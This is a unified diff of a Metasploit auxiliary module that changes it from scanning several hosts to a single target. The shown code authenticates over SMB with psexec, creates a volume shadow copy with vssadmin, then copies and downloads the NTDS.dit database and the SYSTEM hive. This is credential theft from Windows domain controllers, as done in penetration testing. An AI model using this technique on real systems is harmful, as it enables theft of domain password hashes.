@@ -6,7 +6,6 @@
 ##
 
 require 'msf/core'
-require 'msf/core/exploit/psexec'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -16,7 +15,6 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::SMB::Psexec
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::Scanner
 
 	# Aliases for common classes
 	SIMPLE = Rex::Proto::SMB::SimpleClient
@@ -53,7 +51,6 @@ class Metasploit3 < Msf::Auxiliary
 			OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', 'false']),
 		], self.class)
 
-		deregister_options('RHOST')
 	end
 
 
@@ -63,13 +60,13 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# This is the main control method
-	def run_host(ip)
+	def run
 		# Initialize some variables
 		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
 		logdir = datastore['LOGDIR']
-		@ip = ip
+		@ip = datastore['RHOST']
 		@smbshare = datastore['SMBSHARE']
 		# Try and connect
 		if connect
@@ -93,9 +90,9 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 			if vscpath
-				if !(n = copy_ntds(ip, vscpath, text)) == false && !(s = copy_sys_hive(ip)) == false
-					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
-					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
+				if !(n = copy_ntds(@ip, vscpath, text)) == false && !(s = copy_sys_hive(@ip)) == false
+					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), @ip, logdir)
+					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), @ip, logdir)
 				else
 					print_error("#{peer} - Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
 				end
